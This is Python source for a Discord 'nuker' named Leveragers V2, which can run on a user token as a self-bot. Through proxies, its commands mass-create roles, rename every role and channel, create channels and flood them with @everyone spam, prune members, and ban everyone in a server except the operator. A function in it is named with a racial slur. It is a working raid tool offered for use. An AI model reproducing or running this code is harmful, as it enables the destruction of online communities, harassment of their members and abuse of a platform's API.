import discord, time, string, random, requests, datetime, asyncio, json, os, sys, threading, aiohttp, io,  logging
import pathlib
from time import sleep
import base64
from discord.ext import commands, tasks
from discord import Permissions
from colorama import Fore, Style
from random import randint
from colored import fg, attr
from itertools import cycle
from requests_futures.sessions import FuturesSession
from webserver import keep_alive 

CONFIG_PATH = pathlib.Path(__file__).parent / "config.json"
PROXY_TXT_PATH = pathlib.Path(__file__).parent / "proxies.txt"

def load_config():
    try:
        with open(CONFIG_PATH, "r") as f:
            return json.load(f)
    except Exception:
        return {"proxy": False}

def get_proxy():
    try:
        with open(PROXY_TXT_PATH, "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
        if proxies:
            return random.choice(proxies)
    except Exception:
        pass
    return None

def get_aiohttp_proxy():
    config = load_config()
    if config.get("proxy"):
        proxy = get_proxy()
        return proxy
    return None

def get_requests_proxy():
    config = load_config()
    if config.get("proxy"):
        proxy = get_proxy()
        if proxy:
            return {"http": proxy, "https": proxy}
    return None
sessions = FuturesSession()

class colors:
    main = fg('cyan')  
    reset = attr('reset')


os.system(f'cls & title [Leveragers V2] - Configuration')


token=""
prefix = ">"
CHANNEL_NAMES = "WIZZED BY OnwZ You!"
VCHANNELS_NAMES = "SEIZED BY OnwZ You!"
CATEGORY_NAMES = "OnwZ You! Owns You"
ROLE_NAMES = "OnwZ You! On Top"
SPAM = "@everyone | @here OnwZ You! IS HERE!"


os.system('cls')
os.system('cls' if os.name == 'nt' else 'clear')
os.system('cls' if os.name == 'nt' else 'clear')


def check_token():
    proxies = get_requests_proxy()
    try:
        resp = requests.get(
            "https://discord.com/api/v8/users/@me",
            headers={"Authorization": f'{token}'},
            proxies=proxies,
            timeout=10
        )
        if resp.status_code == 200:
            return "user"
        else:
            return "bot"
    except Exception:
        return "bot"


if sys.platform == "linux":
    clear = lambda: sys("clear")
else:
    clear = lambda: sys("cls & mode 70,24")

token_type = check_token()
intents = discord.Intents.all()
intents.members = True
if token_type == 'user':
    headers = {'Authorization': f"{token}"}
    client = commands.Bot(command_prefix=prefix,
                          case_insensitive=False,
                          self_bot=True,
                          intents=intents)
else:
    if token_type == 'bot':
        headers = {'Authorization': f"Bot {token}"}
        client = commands.Bot(command_prefix=prefix,
                              case_insensitive=False,
                              intents=intents)
os.system('cls')


logging.basicConfig(
    level=logging.INFO,
    format=
    f"{colors.main}[{colors.reset}%(asctime)s{colors.main}] \033[0m%(message)s",
    datefmt="%H:%M:%S",
)


@client.event
async def on_ready():
    await client.change_presence(activity=discord.Streaming(
        name='Leveragers ON TOP!',
        url='https://discord.gg/programmers'))
    os.system('cls' if os.name == 'nt' else 'clear')
    ascii = f"""

 ██▓    ▓█████ ██▒   █▓▓█████  ██▀███   ▄▄▄        ▄████ ▓█████  ██▀███    ██████ 
▓██▒    ▓█   ▀▓██░   █▒▓█   ▀ ▓██ ▒ ██▒▒████▄     ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒▒██    ▒ 
▒██░    ▒███   ▓██  █▒░▒███   ▓██ ░▄█ ▒▒██  ▀█▄  ▒██░▄▄▄░▒███   ▓██ ░▄█ ▒░ ▓██▄   
▒██░    ▒▓█  ▄  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄  ░██▄▄▄▄██ ░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄    ▒   ██▒
░██████▒░▒████▒  ▒▀█░  ░▒████▒░██▓ ▒██▒ ▓█   ▓██▒░▒▓███▀▒░▒████▒░██▓ ▒██▒▒██████▒▒
░ ▒░▓  ░░░ ▒░ ░  ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░
░ ░ ▒  ░ ░ ░  ░  ░ ░░   ░ ░  ░  ░▒ ░ ▒░  ▒   ▒▒ ░  ░   ░  ░ ░  ░  ░▒ ░ ▒░░ ░▒  ░ ░
  ░ ░      ░       ░░     ░     ░░   ░   ░   ▒   ░ ░   ░    ░     ░░   ░ ░  ░  ░  
    ░  ░   ░  ░     ░     ░  ░   ░           ░  ░      ░    ░  ░   ░           ░  
                   ░                                                               
"""

    term_width = 80
    print("\033[38;2;163;185;239m" + '\n'.join([line.center(term_width) for line in ascii.split('\n')]) + "\033[0m")
    info_lines = [
        f"Username : {client.user}",
        f"guilds : {len(client.guilds)}",
        f"Prefix : {client.command_prefix}"
    ]
    for line in info_lines:
        print("\033[38;2;163;185;239m" + line.center(term_width) + "\033[0m")

@client.command()
async def cr(ctx):
    try:
        await ctx.message.delete()
        guild = ctx.guild.id
    except:
        logging.info(f"Connection error.")
    def nigger(i):
        json = {
          "name": i
        }
        r = sessions.post(f"https://discord.com/api/v9/guilds/{guild}/roles", headers=headers, json=json)
    for i in range(500):
        threading.Thread(
          target=nigger,
          args=(random.choice(ROLE_NAMES), )
          ).start()
        logging.info(f"Created role {random.choice(ROLE_NAMES)}.")
    await asyncio.sleep(10)


@client.command()
async def rr(ctx, *, role_name: str):
    await ctx.message.delete()
    server_id = str(ctx.guild.id)
    bot_token = token if token_type == 'user' else token
    current_time = datetime.datetime.now().strftime('%H:%M:%S')
    proxy = get_aiohttp_proxy()
    async def fetch_roles(session):
        url = f'https://discord.com/api/v9/guilds/{server_id}/roles'
        headers = {'Authorization': f'{bot_token}'}
        async with session.get(url, headers=headers, proxy=proxy) as response:
            if response.status == 200:
                return await response.json()
            else:
                print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to fetch roles")
                return []

    async def rex_rename_role(session, new_name, role_id):
        url = f'https://discord.com/api/v9/guilds/{server_id}/roles/{role_id}'
        headers = {'Authorization': f'{bot_token}'}
        data = {'name': new_name}
        try:
            async with session.patch(url, headers=headers, json=data, proxy=proxy) as response:
                if response.status == 429:
                    print(f"{Fore.YELLOW}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.YELLOW}]{Fore.LIGHTBLACK_EX} -{Fore.YELLOW} RATELIMITED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}TRYING SOON...")
                elif response.status == 200:
                    print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Renamed Role {role_id} to {new_name}.")
                else:
                    print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Couldn't rename role {role_id}")
        except Exception as e:
            print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Error renaming role {role_id}: {e}")

    async with aiohttp.ClientSession() as session:
        roles = await fetch_roles(session)
        roles = [role for role in roles if role['name'] != "@everyone"]
        batch_size = 5
        total = len(roles)
        for i in range(0, total, batch_size):
            batch = roles[i:i+batch_size]
            await asyncio.gather(*[rex_rename_role(session, role_name, role['id']) for role in batch])
            await asyncio.sleep(2)

@client.command()
async def cc(ctx):
    await ctx.message.delete()
    server_id = str(ctx.guild.id)
    bot_token = token if token_type == 'user' else token
    current_time = datetime.datetime.now().strftime('%H:%M:%S')
    headers = {'Authorization': f'{bot_token}'}
    proxy = get_aiohttp_proxy()

    async def create_channel(session, current_time, server_id, headers):
        try:
            async with session.post(f'https://discord.com/api/v9/guilds/{server_id}/channels', headers=headers, json={'name': CHANNEL_NAMES, 'type': 0}, proxy=proxy) as r:
                if r.status in [200, 201, 204]:
                    resp = await r.json()
                    channel_id = resp.get('id')
                    print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Created Channel to {server_id} - {CHANNEL_NAMES}")
                    return channel_id
                elif r.status == 429:
                    print(f"{Fore.YELLOW}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.YELLOW}]{Fore.LIGHTBLACK_EX} -{Fore.YELLOW} RATELIMITED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}TRYING SOON...")
                    await asyncio.sleep(2)
                else:
                    print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Couldn't Create Channel to {server_id}")
        except Exception as e:
            print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Error creating channel: {e}")
        return None

    async def spam_channel(session, current_time, channel_id, headers):
        for _ in range(5):
            try:
                async with session.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=headers, json={'content': SPAM}, proxy=proxy) as r2:
                    if r2.status in [200, 201, 204]:
                        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SPAMMED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Channel {channel_id}")
                    elif r2.status == 429:
                        print(f"{Fore.YELLOW}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.YELLOW}]{Fore.LIGHTBLACK_EX} -{Fore.YELLOW} RATELIMITED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}TRYING SOON...")
                    else:
                        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Couldn't spam channel {channel_id}")
                await asyncio.sleep(2)
            except Exception as e:
                print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Error spamming channel {channel_id}: {e}")

    async with aiohttp.ClientSession() as session:
        total_channels = 15
        batch_size = 5
        channel_ids = []
        for batch_start in range(0, total_channels, batch_size):
            tasks = []
            for i in range(batch_start, min(batch_start + batch_size, total_channels)):
                tasks.append(create_channel(session, current_time, server_id, headers))
            results = await asyncio.gather(*tasks)
            channel_ids.extend([cid for cid in results if cid])
            await asyncio.sleep(1.5)
        spam_tasks = [spam_channel(session, current_time, cid, headers) for cid in channel_ids]
        await asyncio.gather(*spam_tasks)


@client.command()
async def rc(ctx, *, chan_name: str):
    await ctx.message.delete()
    server_id = str(ctx.guild.id)
    bot_token = token if token_type == 'user' else token
    current_time = datetime.datetime.now().strftime('%H:%M:%S')
    proxy = get_aiohttp_proxy()

    async def fetch_channels(session):
        url = f'https://discord.com/api/v9/guilds/{server_id}/channels'
        headers = {'Authorization': f'{bot_token}'}
        async with session.get(url, headers=headers, proxy=proxy) as response:
            if response.status == 200:
                return await response.json()
            else:
                print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to fetch channels")
                return []

    async def rex_rename_channel(session, new_name, channel_id):
        url = f'https://discord.com/api/v9/channels/{channel_id}'
        headers = {'Authorization': f'{bot_token}'}
        data = {'name': new_name}
        try:
            async with session.patch(url, headers=headers, json=data, proxy=proxy) as response:
                if response.status == 429:
                    print(f"{Fore.YELLOW}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.YELLOW}]{Fore.LIGHTBLACK_EX} -{Fore.YELLOW} RATELIMITED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}TRYING SOON...")
                else:
                    if response.status == 200:
                        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Renamed Channel {channel_id} to {new_name}.")
                    else:
                        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Couldn't rename channel {channel_id}.")
        except Exception as e:
            print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Error renaming channel {channel_id}: {e}")

    async with aiohttp.ClientSession() as session:
        channels = await fetch_channels(session)
        channels = [c for c in channels if c.get('type') in [0, 2]]
        batch_size = 5
        total = len(channels)
        for i in range(0, total, batch_size):
            batch = channels[i:i+batch_size]
            await asyncio.gather(*[rex_rename_channel(session, chan_name, channel['id']) for channel in batch])
            await asyncio.sleep(2)


@client.command()
async def prune(ctx):
    await ctx.message.delete()
    server_id = str(ctx.guild.id)
    bot_token = token if token_type == 'user' else token
    current_time = datetime.datetime.now().strftime('%H:%M:%S')
    headers = {'Authorization': f'{bot_token}'}
    proxy = get_aiohttp_proxy()
    async with aiohttp.ClientSession() as session:
        url = f'https://discord.com/api/v9/guilds/{server_id}/prune'
        data = {'days': 1}
        try:
            async with session.post(url, headers=headers, json=data, proxy=proxy) as response:
                if response.status == 200:
                    resp = await response.json()
                    pruned = resp.get('pruned', 'Unknown')
                    print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Pruned {pruned} members inactive for 1 day.")
                elif response.status == 429:
                    print(f"{Fore.YELLOW}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.YELLOW}]{Fore.LIGHTBLACK_EX} -{Fore.YELLOW} RATELIMITED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}TRYING SOON...")
                else:
                    print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Couldn't prune members.")
        except Exception as e:
            print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Error pruning members: {e}")

@client.command()
async def ban(ctx):
    await ctx.message.delete()
    current_time = datetime.datetime.now().strftime('%H:%M:%S')
    for member in ctx.guild.members:
        if member.id != ctx.author.id and member.id != client.user.id:
            try:
                await member.ban(reason="fuck")
                print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} BANNED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Banned {member}.")
            except Exception as e:
                print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Error banning {member}: {e}")

keep_alive()
client.run(token, bot=False)


